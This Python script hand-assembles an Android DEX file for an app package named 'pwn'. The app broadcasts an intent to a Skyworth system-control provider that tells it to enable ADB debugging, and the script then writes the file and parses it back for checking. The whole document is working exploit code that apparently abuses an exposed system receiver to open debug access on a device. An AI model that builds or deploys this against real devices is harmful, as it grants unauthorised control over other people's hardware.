#!/usr/bin/env python3
"""Assemble a minimal classes.dex (dex 035) for com.omp.pwn.MainActivity.

onCreate(Bundle):
  invoke-super {p0,p1}, Landroid/app/Activity;.onCreate(Landroid/os/Bundle;)V
  new-instance v0, Landroid/content/Intent;
  const-string v1, "com.skyworth.sysctl.action.ENABLE_ADB"
  invoke-direct {v0,v1}, Landroid/content/Intent;.<init>(Ljava/lang/String;)V
  const-string v1, "com.skyworth.sysctl.provider"
  invoke-virtual {v0,v1}, Landroid/content/Intent;.setPackage(...)Intent
  const-string v1, "status"
  const-string v2, "true"
  invoke-virtual {v0,v1,v2}, Landroid/content/Intent;.putExtra(...)Intent
  invoke-virtual {p0,v0}, Landroid/content/Context;.sendBroadcast(Landroid/content/Intent;)V
  return-void

<init>():
  invoke-direct {p0}, Landroid/app/Activity;.<init>()V
  return-void
"""
import struct, zlib, hashlib, sys

MUTF = lambda s: s.encode('utf-8')  # our strings are ASCII -> MUTF-8 == UTF-8

def uleb(n):
    out = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: out.append(b | 0x80)
        else:
            out.append(b); return bytes(out)

def align(b, n=4): return b + b'\x00' * ((-len(b)) % n)

# ---------------------------------------------------------------- table data
strings = [
    'Lcom/omp/pwn/MainActivity;',      # 0
    'Landroid/app/Activity;',          # 1
    'Landroid/content/Intent;',        # 2
    'Landroid/content/Context;',       # 3
    'Landroid/os/Bundle;',             # 4
    'Ljava/lang/String;',              # 5
    'V',                                # 6
    '<init>',                           # 7
    'onCreate',                         # 8
    '()V',                              # 9
    '(Landroid/os/Bundle;)V',           # 10
    '(Ljava/lang/String;)V',            # 11  proto Intent.<init> return V? no -
    # proto for Intent.<init>(String) returns V: shorty VL
    '(Ljava/lang/String;)Landroid/content/Intent;',  # 12
    '(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;',  # 13
    '(Landroid/content/Intent;)V',      # 14
    'com.skyworth.sysctl.action.ENABLE_ADB',  # 15
    'com.skyworth.sysctl.provider',     # 16
    'status',                           # 17
    'true',                             # 18
    'setPackage',                       # 19
    'putExtra',                         # 20
    'sendBroadcast',                    # 21
]
# shorty strings: ()V -> V; (Bundle)V -> VL; (String)Intent -> LL; (String,String)Intent -> LLL
strings += ['VL', 'LL', 'LLL']      # 22,23,24  (V already at 6)

S = {s: i for i, s in enumerate(strings)}

types = ['Lcom/omp/pwn/MainActivity;', 'Landroid/app/Activity;',
         'Landroid/content/Intent;', 'Landroid/content/Context;',
         'Landroid/os/Bundle;', 'Ljava/lang/String;', 'V']
T = {t: i for i, t in enumerate(types)}

def type_list(*names):
    # type_list: size(4) + u16 items; must be 4-aligned in file (we align at write)
    return sorted(T[n] for n in names)

# proto_id: shorty(4) ret(4) params_off(4)
# protos:
P_VOIDP   = 0  # ()V
P_BUNDLE  = 1  # (Bundle)V
P_STRV    = 2  # (String)V          - Intent.<init>
P_STRINT  = 3  # (String)Intent     - setAction/setPackage
P_STR2I   = 4  # (String,String)Intent - putExtra
P_INTENTV = 5  # (Intent)V          - sendBroadcast

protos = [
    ('V',    'V', []),
    ('VL',   'V', ['Landroid/os/Bundle;']),
    ('VL',   'V', ['Ljava/lang/String;']),
    ('LL',   'Landroid/content/Intent;', ['Ljava/lang/String;']),
    ('LLL',  'Landroid/content/Intent;', ['Ljava/lang/String;', 'Ljava/lang/String;']),
    ('VL',   'V', ['Landroid/content/Intent;']),
]

# method_ids: class(2) proto(2) name(4)
methods = [
    ('Landroid/app/Activity;',   P_VOIDP,   '<init>'),        # 0
    ('Landroid/app/Activity;',   P_BUNDLE,  'onCreate'),      # 1
    ('Landroid/content/Intent;', P_STRV,    '<init>'),        # 2
    ('Landroid/content/Intent;', P_STRINT,  'setPackage'),    # 3
    ('Landroid/content/Intent;', P_STR2I,   'putExtra'),      # 4
    ('Landroid/content/Context;',P_INTENTV, 'sendBroadcast'), # 5
]
M = {}
for i, (c, p, n) in enumerate(methods):
    M[(c, n)] = i

# ---------------------------------------------------------------- bytecode
OP_INVOKE_VIRTUAL = 0x6e
OP_INVOKE_SUPER   = 0x6f
OP_INVOKE_DIRECT  = 0x70
OP_RETURN_VOID    = 0x0e
OP_NEW_INSTANCE   = 0x22
OP_CONST_STRING   = 0x1a

def i35c(op, method_idx, *regs):
    """format35c: [A|G|op][BBBB idx][F|E|D|C regs]; A=count (<=5)"""
    assert len(regs) <= 5
    A = len(regs)
    word0 = (A << 12) | op
    regs_u16 = 0
    for i, r in enumerate(regs):
        regs_u16 |= r << (4 * i)
    return [word0, method_idx, regs_u16]

def i21c(op, reg, idx):
    """format21c: [op|A reg][BBBB idx]"""
    return [(reg << 8) | op, idx]

def insn_u32(idx):
    return [idx & 0xFFFF, (idx >> 16) & 0xFFFF]

# onCreate: 5 registers (v0..v2 scratch, p0=v3 this, p1=v4 bundle)
oncreate = []
oncreate += i35c(OP_INVOKE_SUPER, M[('Landroid/app/Activity;','onCreate')], 3, 4)
oncreate += [(0 << 8) | OP_NEW_INSTANCE] + insn_u32(T['Landroid/content/Intent;'])
# const-string v1, action
oncreate += [(1 << 8) | OP_CONST_STRING] + insn_u32(S['com.skyworth.sysctl.action.ENABLE_ADB'])
# invoke-direct {v0,v1}, Intent.<init>
oncreate += i35c(OP_INVOKE_DIRECT, M[('Landroid/content/Intent;','<init>')], 0, 1)
# const-string v1, pkg
oncreate += [(1 << 8) | 0x1a] + insn_u32(S['com.skyworth.sysctl.provider'])
# invoke-virtual {v0,v1}, setPackage
oncreate += i35c(OP_INVOKE_VIRTUAL, M[('Landroid/content/Intent;','setPackage')], 0, 1)
# const-string v1 "status"; const-string v2 "true"
oncreate += [(1 << 8) | 0x1a] + insn_u32(S['status'])
oncreate += [(2 << 8) | 0x1a] + insn_u32(S['true'])
# invoke-virtual {v0,v1,v2}, putExtra
oncreate += i35c(OP_INVOKE_VIRTUAL, M[('Landroid/content/Intent;','putExtra')], 0, 1, 2)
# invoke-virtual {v3,v0}, sendBroadcast
oncreate += i35c(OP_INVOKE_VIRTUAL, M[('Landroid/content/Context;','sendBroadcast')], 3, 0)
oncreate += [OP_RETURN_VOID]

# <init>: p0 = v0 (ins=1)
init = i35c(OP_INVOKE_DIRECT, M[('Landroid/app/Activity;','<init>')], 0) + [OP_RETURN_VOID]

OP_CONST_STRING = 0x1a

def build_code(regs, ins, outs, insns_words):
    insns = b''.join(struct.pack('<H', w) for w in insns_words)
    if len(insns) % 4:  # pad to even # of units; insns_size counts 16-bit units
        insns += b'\x00\x00'
    insns_size_units = len(insns) // 2
    # code_item: regs(2) ins(2) outs(2) tries(2) debug_off(4) insns_size(4) insns (tries=0)
    return struct.pack('<4H2I', regs, ins, outs, 0, 0, insns_size_units) + insns

code_init     = build_code(1, 1, 1, init)
code_oncreate = build_code(5, 2, 3, oncreate)

# ---------------------------------------------------------------- layout
# We'll write sections sequentially; offsets computed as we go.
header_size = 112

# --- strings (uleb len + mutf8 + NUL), offsets into string data blob
str_blob = bytearray()
str_offs = []
for s in strings:
    b = MUTF(s)
    str_offs.append(len(str_blob))
    str_blob += uleb(len(s)) + b + b'\x00'
str_blob = align(bytes(str_blob))

# --- type lists blob (for protos), 4-aligned entries
tl_blob = bytearray()
tl_offs = {}
def add_type_list(idxlist):
    global tl_blob
    if not idxlist:
        return 0
    key = tuple(idxlist)
    if key in tl_offs:
        return tl_offs[key]
    # align within blob
    while len(tl_blob) % 4:
        tl_blob += b'\x00'
    tl_offs[key] = len(tl_blob)
    tl_blob += struct.pack('<I', len(idxlist))
    for t in idxlist:
        tl_blob += struct.pack('<H', t)
    return tl_offs[key]

proto_param_offs = [add_type_list(type_list(*p[2])) for p in protos]
tl_blob = align(bytes(tl_blob))

# --- code items blob (4-aligned)
code_blob = bytearray()
code_offs = {}
def add_code(code):
    global code_blob
    while len(code_blob) % 4:
        code_blob += b'\x00'
    off = len(code_blob)
    code_blob += code
    return off

co_init = add_code(code_init)
co_create = add_code(code_oncreate)
code_blob = align(bytes(code_blob))


# --- class_data (uleb stream): 1 class, direct=[init], virtual=[onCreate]
# NOTE: needs L['code'] (final file offset of code section), so built AFTER layout().
class_data = None  # built after L = layout() below
# ---------------------------------------------------------------- assemble
def u16s(b): return b

str_ids  = b''.join(struct.pack('<I', o) for o in str_offs)
type_ids = b''.join(struct.pack('<I', S[t]) for t in types)
proto_ids = b''
for (shorty, ret, _), poff in zip(protos, proto_param_offs):
    proto_ids += struct.pack('<III', S[shorty], S[ret], poff)
meth_ids = b''.join(struct.pack('<HHI', T[c], p, S[n]) for (c, p, n) in methods)
class_defs = struct.pack('<8I',
    T['Lcom/omp/pwn/MainActivity;'],  # class
    0x00000001,                        # access: public
    T['Landroid/app/Activity;'],       # super
    0,                                 # interfaces_off
    0,                                 # source_file_idx
    0,                                 # annotations_off
    0,                                 # class_data_off - patched
    0)                                 # static_values_off


def align_data(p): return p + ((-p) % 4)

# redo with align inside (fix ordering: define align_data first)
def layout():
    pos = header_size
    o = {}
    o['str_ids'] = pos; pos = align_data(pos + 4*len(strings))
    o['str_data'] = pos; pos = align_data(pos + len(str_blob))
    o['type_ids'] = pos; pos = align_data(pos + 4*len(types))
    o['proto_ids'] = pos; pos = align_data(pos + 12*len(protos))
    o['tl'] = pos; pos = align_data(pos + len(tl_blob))
    o['meth_ids'] = pos; pos = align_data(pos + 8*len(methods))
    o['class_data'] = pos; pos = align_data(pos + len(class_data))
    o['code'] = pos; pos = align_data(pos + len(code_blob))
    o['class_def'] = pos; pos += 32
    o['map'] = pos; pos += 4 + 13*12
    o['end'] = pos
    return o

# uleb length of code offsets doesn't depend on L (3 bytes for any offset in this range),
# so size class_data once, then compute layout, then finalize offsets.
def build_class_data(code_base):
    return align(bytes(uleb(0) + uleb(0) + uleb(1) + uleb(1)
        + uleb(0) + uleb(0x10001) + uleb(co_init + code_base)
        + uleb(M[('Landroid/app/Activity;','onCreate')]) + uleb(0x0001) + uleb(co_create + code_base)))
class_data = build_class_data(0x400000)  # size-stable placeholder (3-byte ulebs)
L = layout()
class_data = build_class_data(L['code'])

out = bytearray(L['end'])
out[0:8] = b'dex\n035\x00'
out[32:36] = struct.pack('<I', L['end'])
out[36:40] = struct.pack('<I', 112)
out[40:44] = struct.pack('<I', 0x12345678)
out[52:56] = struct.pack('<I', 0)  # map_off patched later
out[56:60] = struct.pack('<I', len(strings))
out[60:64] = struct.pack('<I', L['str_ids'])
out[64:68] = struct.pack('<I', len(types))
out[68:72] = struct.pack('<I', L['type_ids'])
out[72:76] = struct.pack('<I', len(protos))
out[76:80] = struct.pack('<I', L['proto_ids'])
out[80:84] = struct.pack('<I', 0)  # field count
out[84:88] = struct.pack('<I', 0)
out[88:92] = struct.pack('<I', len(methods))
out[92:96] = struct.pack('<I', L['meth_ids'])
out[96:100] = struct.pack('<I', 1)
out[100:104] = struct.pack('<I', L['class_def'])
out[104:108] = struct.pack('<I', L['end'] - L['str_data'])
out[108:112] = struct.pack('<I', L['str_data'])

out[L['str_ids']:L['str_ids']+4*len(strings)] = b''.join(
    struct.pack('<I', L['str_data'] + o) for o in str_offs)
out[L['str_data']:L['str_data']+len(str_blob)] = str_blob
out[L['class_def']:L['class_def']+32] = class_defs
out[L['type_ids']:L['type_ids']+4*len(types)] = b''.join(
    struct.pack('<I', S[t]) for t in types)
for i, ((shorty, ret, _), poff) in enumerate(zip(protos, proto_param_offs)):
    out[L['proto_ids']+12*i: L['proto_ids']+12*i+12] = struct.pack(
        '<III', S[shorty], S[ret], (L['tl'] + poff) if _ else 0)
out[L['tl']:L['tl']+len(tl_blob)] = tl_blob
out[L['meth_ids']:L['meth_ids']+8*len(methods)] = b''.join(
    struct.pack('<HHI', T[c], p, S[n]) for (c, p, n) in methods)
out[L['class_data']:L['class_data']+len(class_data)] = class_data
out[L['code']:L['code']+len(code_blob)] = code_blob
# class_def: patch class_data_off + proto param offsets are relative to tl blob
cdoff = struct.pack('<I', L['class_data'])
out[L['class_def']+24:L['class_def']+28] = cdoff

# map_list: order by type
map_entries = [
    (0x0000, 1, 0),
    (0x0001, len(strings), L['str_ids']),
    (0x0002, len(types), L['type_ids']),
    (0x0003, len(protos), L['proto_ids']),
    (0x0005, len(methods), L['meth_ids']),
    (0x1001, sum(1 for k in tl_offs if k), L['tl']),  # type_lists
    (0x2001, 2, L['code']),          # code_items
    (0x2002, len(strings), L['str_data']),  # string_data
    (0x2000, 1, L['class_data']),    # class_data
    (0x0006, 1, L['class_def']),
    (0x1000, 1, L['map']),
]
# NOTE: map list must be sorted by type value ascending? Spec: yes, ordered.
map_entries.sort()
b = struct.pack('<I', len(map_entries))
for (t, sz, off) in map_entries:
    b += struct.pack('<HHII', t, 0, sz, off)
out[L['map']:L['map']+len(b)] = b
out[52:56] = struct.pack('<I', L['map'])

# checksum + signature
body = bytes(out[12:])
sig = hashlib.sha1(body).digest()
out[12:32] = sig
out[8:12] = struct.pack('<I', zlib.adler32(bytes(out[12:])) & 0xFFFFFFFF)

open('/tmp/apk/classes_pwn.dex','wb').write(bytes(out))
print('dex written:', len(out), 'bytes')

# quick parse-back with androguard
from androguard.core.dex import DEX
d = DEX(bytes(out))
for c in d.get_classes():
    print('class:', c.get_name())
    for m in c.get_methods():
        print('  method:', m.get_name(), m.get_descriptor())
        for ins in m.get_instructions():
            print('    ', ins.get_name(), ins.get_output())
